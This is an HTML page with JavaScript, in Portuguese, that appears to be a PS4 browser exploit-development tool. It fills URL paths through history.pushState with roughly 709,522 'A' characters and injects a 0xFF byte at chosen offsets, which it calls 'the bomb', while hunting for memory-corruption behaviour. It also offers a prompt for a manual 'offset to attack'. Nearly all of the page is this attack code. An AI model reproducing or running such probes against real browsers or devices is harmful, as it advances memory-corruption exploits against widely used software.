<!DOCTYPE html>
<html>
<head>
    <title>PS4 Header Hunter (Backwards)</title>
    <style>
        body { background-color: #000; color: #ff5500; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 20px; padding: 20px; margin: 10px; cursor: pointer; 
            width: 100%; border: 2px solid #ff5500; background: #220000; color: #fff; font-weight: bold;
        }
        .safe { border-color: #00ff00; background: #002200; }
        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: cyan; text-align: left; }
    </style>
</head>
<body>

    <h1>Caçador de Cabeçalhos (Recuo)</h1>
    <p>Vamos testar se a "Zona Segura" é realmente segura contra 0xFF.</p>
    <div id="log">Pronto. Offset Base: 709.522</div>

    <button onclick="testOffset(709520)">
        1. Testar 709.520 (Recuo -2)<br>
        <small>Tentativa de corromper alinhamento de 8 bytes</small>
    </button>

    <button onclick="testOffset(709512)">
        2. Testar 709.512 (Recuo -10)<br>
        <small>Alinhamento de 16 bytes (CRÍTICO)</small>
    </button>

    <button onclick="testOffset(709504)">
        3. Testar 709.504 (Recuo -18)<br>
        <small>Alinhamento de 32 bytes</small>
    </button>
    
    <button class="safe" onclick="manualTest()">
        4. Testar Offset Manual...
    </button>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += `<div>${msg}</div>`;
        }

        function testOffset(targetIndex) {
            log(`Testando injeção de 0xFF na posição ${targetIndex}...`);
            
            setTimeout(() => {
                try {
                    // 1. Criamos a base de 'A's SOMENTE até o ponto alvo
                    // Isso significa que tudo depois do alvo será deixado como estava (ou zero/lixo)
                    // Mas queremos testar se escrever NESSE ponto causa erro.
                    
                    let buffer = "A".repeat(targetIndex);
                    
                    // 2. A BOMBA
                    buffer += "\xFF"; 

                    // 3. Preenchemos o resto com 'A' até o limite seguro antigo (522)
                    // Para garantir que o tamanho total da string seja o mesmo dos testes anteriores
                    let remaining = 709522 - (targetIndex + 1);
                    if (remaining > 0) {
                        buffer += "A".repeat(remaining);
                    }

                    history.pushState({}, "header_hunt", "/" + buffer);
                    
                    log(`SOBREVIVEU! A posição ${targetIndex} aceita 0xFF.`);

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 500);
        }

        function manualTest() {
            let val = prompt("Digite o offset para atacar (ex: 709518):");
            if (val) testOffset(parseInt(val));
        }
    </script>
</body>
</html>
